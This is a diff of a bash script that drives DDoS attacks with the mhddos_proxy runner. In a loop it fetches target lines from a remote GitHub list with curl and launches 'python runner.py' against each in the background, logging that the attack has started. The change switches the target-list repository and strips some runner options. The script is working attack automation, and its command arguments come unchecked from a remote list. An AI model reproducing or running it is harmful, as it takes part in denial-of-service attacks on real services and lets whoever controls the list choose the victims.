@@ -130,15 +130,15 @@ do
    	do
             echo -e "\n I = $i"
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
            
 
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            echo "python runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads --table"
+            echo "python runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads "
             
             cd ~/mhddos_proxy
    
-            python runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads --table&
+            python runner.py $cmd_line  &
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
